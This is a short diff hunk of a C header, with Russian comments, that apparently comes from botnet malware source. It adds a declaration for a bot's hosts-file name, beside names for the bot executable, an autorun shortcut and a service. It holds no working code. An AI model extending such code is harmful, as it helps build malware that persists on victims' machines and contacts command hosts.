@@ -46,6 +46,10 @@ extern CSSTR EStrOriginalBotExeName[];
 extern CSSTR EStrBotStartupLinkName[];  // Имя ярлыка в автозагрузке
 
 
+// Имя файла для хранения хостов бота
+extern CSSTR EStrHostsFileName[];
+
+
 // Имя сервиса
 extern CSSTR EStrServiceName[];
 
